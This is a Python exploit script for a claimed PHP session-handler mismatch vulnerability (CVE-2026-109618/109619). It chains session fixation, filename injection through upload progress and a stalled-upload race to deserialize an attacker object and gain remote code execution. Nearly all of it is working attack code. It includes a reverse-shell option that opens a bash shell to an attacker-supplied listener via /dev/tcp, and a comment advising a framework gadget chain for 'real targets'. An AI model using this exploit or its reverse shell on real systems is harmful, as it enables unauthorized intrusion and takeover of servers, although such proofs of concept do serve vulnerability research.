#!/usr/bin/env python3
"""
CVE-2026-109618/109619 - Session Handler Mismatch -> __destruct RCE
Exploits a per-path session.serialize_handler split + upload_progress filename
injection to deserialize an attacker object under the `php` handler.

Chain:
  1. (optional) pollute an FPM worker that sets php_serialize
  2. Session fixation: choose the SID (use_strict_mode=0 default)
  3. upload_progress POST to a php_serialize path with |O:CLASS:N:{...} in the
     filename -> written in php_serialize format into the session file
  4. a php-handler path reads it -> splits at | -> unserializes the trailing
     bytes as an object -> __destruct() fires the gadget -> RCE

Stock targets run session.upload_progress.cleanup=On (the PHP default), which
deletes the progress record as soon as the upload body finishes. So by default
we send a STALLED upload (large Content-Length, body withheld) that keeps the
record - and therefore the gadget - alive in the session file, and fire the
read trigger during the stall. Use --no-stall for a cleanup=Off target.

Usage:
  python3 chain_c_mismatch_rce.py --target http://host:8082 \
      --upload-path /app/upload.php --trigger-path /api/endpoint.php --command id
"""

import argparse
import sys
import time
import uuid

from lib import send_raw, connect, parse_target


def step1_pollute_worker(host, port, pollute_path, tls=False, attempts=10):
    if not pollute_path:
        return
    print(f"[1] Polluting FPM workers via {pollute_path}...")
    for _ in range(attempts):
        req = (f"GET {pollute_path} HTTP/1.1\r\nHost: {host}\r\n"
               f"Connection: close\r\n\r\n").encode()
        send_raw(host, port, req, tls=tls)
    print(f"    Sent {attempts} requests")


def build_multipart_prefix(sid, gadget, boundary):
    """Everything up to (but not including) the withheld upload body."""
    filename = "x|" + gadget.replace('"', '\\"')
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\n'
    ).encode("latin-1")


def inject_stalled(host, port, upload_path, sid, gadget, tls=False,
                   boundary="EXPLOIT", timeout=20):
    """Open a stalled upload: declare a big Content-Length, send the gadget
    filename + a little body (triggers FILE_START -> the record, with the gadget,
    is written to the session file), then withhold the rest. Returns the open
    socket so the record stays live while we fire the read trigger."""
    prefix = build_multipart_prefix(sid, gadget, boundary)
    # body must exceed rfc1867's 5 KB FILLUNIT so FILE_START fires (and the
    # progress record, with the gadget, is flushed) before we withhold the tail
    first = prefix + b"Z" * 40000
    content_length = len(first) + 500000      # withhold the tail
    req = (
        f"POST {upload_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + first
    sock = connect(host, port, tls=tls, timeout=timeout)
    sock.sendall(req)
    return sock


def inject_complete(host, port, upload_path, sid, gadget, tls=False,
                    boundary="EXPLOIT", attempts=5):
    """cleanup=Off path: a normal completed upload is enough."""
    prefix = build_multipart_prefix(sid, gadget, boundary)
    body = prefix + b"Z\r\n--" + boundary.encode() + b"--\r\n"
    req = (
        f"POST {upload_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    for _ in range(attempts):
        send_raw(host, port, req, tls=tls)


def trigger_read(host, port, trigger_path, sid, tls=False):
    req = (f"GET {trigger_path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
    resp = send_raw(host, port, req, tls=tls)
    return resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"


def build_gadget_generic(cmd):
    """Lab Evil gadget. Replace with a framework POP chain on real targets."""
    return f'O:4:"Evil":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'


def main():
    ap = argparse.ArgumentParser(description="PHP Session Mismatch -> __destruct RCE")
    ap.add_argument("--target", default="http://127.0.0.1:8082")
    ap.add_argument("--pollute-path", default="/app/upload.php")
    ap.add_argument("--upload-path", default="/app/upload.php")
    ap.add_argument("--trigger-path", default="/api/endpoint.php")
    ap.add_argument("--command", default="id")
    ap.add_argument("--lhost", help="reverse shell: your listener IP")
    ap.add_argument("--lport", default="4444", help="reverse shell: your listener port")
    ap.add_argument("--gadget", default="", help="custom serialized gadget (overrides --command)")
    ap.add_argument("--sid", default="")
    ap.add_argument("--no-stall", action="store_true",
                    help="target has session.upload_progress.cleanup=Off")
    ap.add_argument("--attempts", type=int, default=6)
    args = ap.parse_args()

    host, port, tls = parse_target(args.target)
    if args.lhost:
        args.command = f"bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'"
    sid = args.sid or ("exploit" + uuid.uuid4().hex[:20])
    gadget = args.gadget or build_gadget_generic(args.command)

    print("=" * 60)
    print("  CVE-2026-109618/109619 - Session Handler Mismatch RCE")
    print(f"  Target {args.target}   SID {sid}")
    print(f"  mode: {'completed upload (cleanup=Off)' if args.no_stall else 'stalled race (cleanup=On, default)'}")
    print("=" * 60)

    step1_pollute_worker(host, port, args.pollute_path, tls=tls)

    for attempt in range(1, args.attempts + 1):
        print(f"[2/3] attempt {attempt}/{args.attempts}: inject gadget + fire read trigger")
        if args.no_stall:
            inject_complete(host, port, args.upload_path, sid, gadget, tls=tls)
            code = trigger_read(host, port, args.trigger_path, sid, tls=tls)
        else:
            sock = inject_stalled(host, port, args.upload_path, sid, gadget, tls=tls)
            try:
                time.sleep(0.3)
                code = trigger_read(host, port, args.trigger_path, sid, tls=tls)
            finally:
                try:
                    sock.close()
                except Exception:
                    pass
        print(f"      trigger status: {code}")
        time.sleep(0.2)

    print("\n[4] Done. Check the gadget's effect on the target "
          "(lab: /tmp/rce_proof.txt).")


if __name__ == "__main__":
    sys.exit(main() or 0)
